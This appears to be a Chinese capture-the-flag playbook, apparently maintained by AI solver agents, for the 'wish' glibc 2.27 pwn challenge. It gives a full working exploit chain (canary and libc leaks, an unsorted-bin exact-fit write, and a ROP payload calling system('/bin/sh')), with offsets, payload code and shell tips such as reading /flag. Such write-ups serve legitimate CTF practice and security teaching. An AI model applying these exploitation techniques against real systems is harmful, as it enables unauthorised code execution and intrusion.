# wish（初赛 PWN-05 · Pwn · 200 分 · dynamic flag）

**状态：已解出（2026-09-14 决赛测试赛现场验证，提交 accepted）。**
初赛全场 0 解；2026-09-10 测试赛 9 agent 约 800 分钟未闭合；2026-09-14 测试赛两个 agent 并行，
约 45 次连接内拿到 shell，裸值提交通过。本手册即当时实际走通的链路，每一步都有实测证据。

> **更正**：旧版手册写「Partial RELRO、无 canary」——**是错的**。现场用附件二进制复核：
> **PIE + NX + Full RELRO（`PT_GNU_RELRO` + `BIND_NOW`）+ 栈 canary**
> （14 处 `mov rax,fs:0x28`、7 处 `call __stack_chk_fail@plt`；`__stack_chk_fail@GLIBC_2.4` 在 .dynsym）。
> 走 choice6 栈溢出**必须先泄露 canary**。拿到任何「KB 结论」都要先 `readelf`/`objdump` 亲自复核。

## 快速路径（一键 exp）

```bash
export THOST=<靶机IP> ; export TPORT=<端口>     # 不要用往届 IP
python3 /opt/solver/knowledges/xihulunjian/challenges/wish/exp/solve.py remote
# 单连接命中率 ≈ 1/6 × 1/2 ≈ 8%（两道随机门），期望 ~12 次连接；实测 ~45 次内命中
```

预期输出（2026-09-14 实测形态）：

```
==== attempt 44 (t=XXXs) ====
[i1] lucky=574
[i7] s18=0x7f…a3b3 s28=0x7f…9760 s30=0x55…8c20 libc=0x7f…000 pie=0x55…000
[i8] money_after=0x3c7ca0
[***] SHELL  flag=DASCTF{65080658855683335639327030552326}
[FLAG] DASCTF{65080658855683335639327030552326}
```

## 提交规则

flag 是 dynamic 注入的 32 位十进制数字串（`DASCTF{<数字>}`）。**第 1 次提交 `{}` 内裸值**
（2026-09-14 裸值 `65080658855683335639327030552326` 即 accepted）；被拒再试整串；
两拒即止损升级，不猜第三种格式。

## 利用链（10 次迭代恰好用满）

程序：glibc 2.27（附件 `libc.so.6` = Ubuntu `2.27-3ubuntu1.6`），主循环固定 **10 次迭代**，
`choice7` 不消耗 wish 但尾部把 `wishes` 钳到 3 ⇒ 合法形状只有
**「前 5 个消耗 op + 2×choice7 + 后 3 个消耗 op」**。

```
i1  choice2            门 1：赌 rand()%600 >= 500（1/6，失败重连）
i2  choice3(0x88)  A
i3  choice3(0x4f8) B
i4  choice3(0x88)  C   # guard，防 R 与 top 合并
i5  choice5(1)         # free(B)；choice5 自带的孤儿 calloc(0x20) 切走 B 头部 0x30，
                       # 余块 R(0x4d0) 留在 unsorted 且 last_remainder=R
i6  choice7            # canary 泄露并复原（进程存活）
i7  choice7            # libc + PIE 泄露（短读 stale）[此后 wishes 钳到 3]
i8  choice9(0,500,forge)  # 从 A(0x88) 溢出 500 字节，伪造 R.size=0x4d1、R.bk=&money-0x10
i9  choice3(0x4c0)     # calloc nb=0x4d0 与 R.size 精确相等 → exact-fit 摘链写
                       # *(R.bk+0x10) = *(&money) = libc+0x3ebca0（门 2：低 32 位需为正）
i10 choice6(chain)     # 读上限 money/100 ≈ 8~14MB ⇒ 任意长度栈溢出 + ROP → system("/bin/sh")
```

ROP（0x138 = buf 到 canary 的距离；返回地址在 rbp+8 = 0x148）：

```python
chain = b'A'*0x138 + p64(canary) + p64(0) \
      + p64(libc+0x2164f) + p64(libc+0x1b3d88) + p64(libc+0x8aa) + p64(libc+0x4f420)
#      pop rdi ; ret       "/bin/sh"            ret(对齐)     system
```

forge（A_user→R 头的距离实测 0xb0，本地 `/proc/pid/mem` 确证；0xa8/0xb0 两种对齐各写一份双向兜底）：

```python
forge = b'A'*0xa8 + p64(0) + p64(0x4d1) + p64(0x4d1) + p64(T-0x10) + p64(T-0x10)
#                        ^R.prev_size ^R.size        ^fd          ^bk = &money-0x10
```

## 关键原语配方

**canary 泄露（choice7，不消耗 wish）**：`buf=[rbp-0x60]`，`canary=[rbp-8]=buf+0x58`。
第 1 读送 `0x58 填充 + \x41`（越过 canary 恒 0 首字节，`puts` 夹出 canary[1..7]）；
第 2 读送 `0x58 填充 + \x00` 写回低字节复原；第 3 读占位。canary[1..7] 含 `\x00` 会短读 → 重连。

**libc/PIE 泄露（choice7 短读 stale）**：`read(0,buf,0x60)` 只送 N 字节时 `buf[N..0x60)` 保留陈旧帧数据。
- 读 `0x18` 字节 → `buf+0x18` = `libc+0x8d3b3`（`_IO_file_overflow+0x103`）；
- 读 `0x30` 字节 → `buf+0x28` = `libc+0x3ec760`（`_IO_2_1_stdout_`）、`buf+0x30` = `PIE+0x1c20`（低 12 位 `0xc20`）；
- `libc = slot18 - 0x8d3b3`，`pie = slot30 - 0x1c20`；指纹 `DELTA(slot28-slot18) = 0x35f3ad`，base 页对齐。

**unsorted exact-fit 固定值写（进程存活，可继续用）**：2.27 `_int_malloc` 的 unsorted 循环
**先摘链**（`bck->fd = unsorted_chunks(av)`）**后判 exact-fit 立即 return**，跳过后续 size 合法性检查，
故伪造 `bk` 不触发 `unsorted double linked list corrupted`。触发序列即上表 i8/i9：
`calloc`（`__libc_calloc` 直连 `_int_malloc`，**绕过 tcache**）的 nb 必须与伪造 size **精确相等**。

## libc 偏移表（附件 2.27-3ubuntu1.6，readelf/ROPgadget 复核）

| 符号 | offset |
|---|---|
| system | 0x4f420 |
| "/bin/sh" | 0x1b3d88 |
| pop rdi ; ret | 0x2164f |
| ret（栈对齐） | 0x8aa |
| `_IO_file_overflow+0x103`（slot18） | 0x8d3b3 |
| `_IO_2_1_stdout_` | 0x3ec760 |
| `__malloc_hook` / `__free_hook` | 0x3ebc30 / 0x3ed8e8 |
| unsorted head（main_arena+0x60，即写入 money 的固定值） | 0x3ebca0 |

远端指纹三点吻合即可直接套表：slot18 页内 `0x3b3`、slot28 精确匹配、PIE 槽 low12 `0xc20`。

## 失败分支与自动 reroll（exp 已内置）

exp 每连接显式检测并在失败时立刻重连，循环到命中为止：

1. 门 1：`choice2` 回显 `Your lucky number is %d`，`< 500` → 重连（1/6 通过）；
2. 门 2：泄露后预算 `money_after = (libc+0x3ebca0) & 0xffffffff`，`≥ 0x80000000`（int 变负）
   或 `< 0x10000`（太小）→ 重连（约 1/2 通过）；
3. canary[1..7] 含 `\x00` 导致短读 → 重连；
4. ROP 载荷含 `\x0a`（会被 read 按换行截断）→ 重连。

## 环境坑（实测踩过，勿重蹈）

- 靶机容器 **`/dev/null` 不可写**：`cat /flag 2>/dev/null` 会静默失败——**永远裸 `cat /flag`**
  （这条曾浪费一次已到手的 shell）。
- 容器里**没有 `id`**，别拿它当拿 shell 的判据，用 `echo PWNED_OK` 自证。
- 平台沙箱里 **pwntools `interactive()` 会挂死**：exp 全程脚本化 `send`/`recv` + 正则解析，不进交互。
- 提交者与解题者可以是不同 agent：解题 agent 把 flag 发到 `#team`，由 submitter 提交
  （`stopSubmitterOnSolve` 下提交即收工）。

## 本地复现（可选）

附件不带 loader；从 Ubuntu 18.04 `libc6_2.27-3ubuntu1.6_amd64.deb` 解出 `ld-2.27.so`，与附件
`wish`/`libc.so.6` 同目录后 `WISH_RUN=<该目录> python3 exp/solve.py local`。本地沙箱 ASLR 实际固定
（`libc+0x3ebca0` 低 32 位恒为负，门 2 无法自然通过），故 exp 拆两段验证：阶段 A 跑完整堆链到 i9，
直读 `/proc/pid/mem` 断言 `*(PIE+0x2030b0) == libc+0x3ebca0`；阶段 B 手工把 money 改成大正数
（等价远端 1/2 掷骰）再走 choice6 ROP。

## 历史失败路线（2026-09-10 测试赛沉淀，仍有效，勿重走）

| # | 路线 | 证伪原因 |
|---|---|---|
| 1 | tcache poisoning → `__free_hook` | calloc 绕过 tcache（fast path 只在 `__libc_malloc`），free 进 tcache 的块取不回 |
| 2 | unsorted 固定值写 `__free_hook`/`__malloc_hook`/`_IO_list_all`/stdout vtable/house of husk | 写值固定为 `libc+0x3ebca0`（数据地址），落点全不可用（FILE 字段/vtable 检查/arginfo 越界） |
| 3 | House of Force | choice3 尺寸上限 0x4ff，推不动 top |
| 4 | 读堆内容类泄露 | 没有任何堆读输出原语；唯一泄露通道是 choice7 栈 stale |
| 5 | choice9 idx=10（money 当指针） | money 是 int，做不成合法地址 |
| 6 | largebin attack → FSOP 全链 | 机制成立但 **op 预算排不下**（E+V+forge+触发+money > 10）；本链闭合正是因为把「泄露+money 抬升+栈溢出」压进 3 个收尾 op |

> 旧版「choice6 不可行（无 canary / money 不够）」的结论同时被推翻：canary 可以不消耗 wish 地泄露，
> money 可以被 exact-fit 写一次抬到 ~1e9。**卡预算时先重数 op 账，再怀疑机制。**
